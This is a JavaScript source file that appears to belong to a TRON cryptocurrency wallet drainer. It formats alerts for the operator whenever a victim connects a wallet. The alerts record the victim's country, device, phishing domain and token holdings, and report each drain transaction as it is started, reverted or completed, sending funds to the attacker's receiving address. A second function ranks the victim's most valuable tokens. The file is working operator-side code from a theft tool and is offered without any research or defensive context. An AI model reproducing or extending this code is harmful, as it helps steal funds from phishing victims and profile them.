//List of tokens messages
function returnMessage(parameters) {
	return {
		connect: `<b>
♻️ Wallet connected
Setting id: <code>${parameters.indexOfSetting}</code>
Drainer mode: <code>${parameters.mode}</code>
User address: <code>${parameters.address}</code> | <a href="https://tronscan.org/#/address/${parameters.address}">TronScan</a> 
Wallet name: <code>${parameters.walletName}</code>
Country: <code>${parameters.country}</code>
Device: <code>${parameters.device}</code>
Domain and path: <code>${parameters.domainAndPath}</code>
Total value tokens: <code>${parameters.totalValue} $</code>
Most valuable tokens: \n${parameters.tokens}
</b>`,

		startedTransaction: parameters.token
			? `<b>
❕Transaction started on ${parameters.side}: 
Withdrawal method: <code>${parameters.token.withdrawalMethod}</code> 
Domain and path: <code>${parameters.domainAndPath}</code>
Token name: <code>${parameters.token.tokenName.toUpperCase()}</code> 
Token type: <code>${parameters.token.tokenType.toUpperCase()}</code> 
Token contract: <code>${parameters.token.tokenId}</code> 
Token amount: <code>${parameters.token.quantity}</code> 
Token balance: <code>${parameters.token.amountInUsd} $</code> 
Token decimal: <code>${parameters.token.tokenDecimal}</code>
From: <code>${parameters.address}</code> 
To: <code>${parameters.receiver}</code>
</b>`
			: `<b>No transaction details available.</b>`,

		revertedTransaction: parameters.token
			? `<b>
❌ Transaction reverted: on ${parameters.side}: 
Withdrawal method: <code>${parameters.token.withdrawalMethod}</code>  
Domain and path: <code>${parameters.domainAndPath}</code>
Token name: <code>${parameters.token.tokenName.toUpperCase()}</code> 
Token type: <code>${parameters.token.tokenType.toUpperCase()}</code> 
Token contract: <code>${parameters.token.tokenId}</code> 
Token amount: <code>${parameters.token.quantity}</code> 
Token balance: <code>${parameters.token.amountInUsd} $</code> 
Token decimal: <code>${parameters.token.tokenDecimal}</code>
From: <code>${parameters.address}</code> 
To: <code>${parameters.receiver}</code>
${parameters.error ? `Error: <code>${parameters.error}</code>` : 'Unknow error'}
</b>`
			: `<b>No transaction details available.</b>`,

		completedTransaction: parameters.token
			? `<b>
✅ Transaction completed: on ${parameters.side}: 
Withdrawal method: <code>${parameters.token.withdrawalMethod}</code>  
Domain and path: <code>${parameters.domainAndPath}</code>
Token name: <code>${parameters.token.tokenName.toUpperCase()}</code>
Token type: <code>${parameters.token.tokenType.toUpperCase()}</code>  
Token contract: <code>${parameters.token.tokenId}</code> 
Token amount: <code>${parameters.token.quantity}</code> 
Token balance: <code>${parameters.token.amountInUsd} $</code> 
Token decimal: <code>${parameters.token.tokenDecimal}</code>
From: <code>${parameters.address}</code> 
To: <code>${parameters.receiver}</code>
Transaction Hash: https://tronscan.org/#/transaction/${parameters.hash}
</b>`
			: `<b>No transaction details available.</b>`,
	}
}

//Create a message with the most valuable tokens
function createListofTokensForMessage(tokens) {
	const message = tokens
		.map(
			(token, index) =>
				`<code>${index + 1}:</code> 
Name: <code>${token.tokenName.toUpperCase()}</code> 
Type: <code>${token.tokenType.toUpperCase()}</code> 
Address: <code>${token.tokenId}</code> 
Amount: <code>${token.quantity}</code>
Balance: <code>${token.tokenType === 'trc10' || token.tokenType === 'trc20' ? token.amountInUsd + '$' : 'Unknown'}</code>
Decimal: <code>${token.tokenDecimal}</code>
`,
		)
		.join('\n')
	return message
}

module.exports = {
	returnMessage,
	createListofTokensForMessage,
}
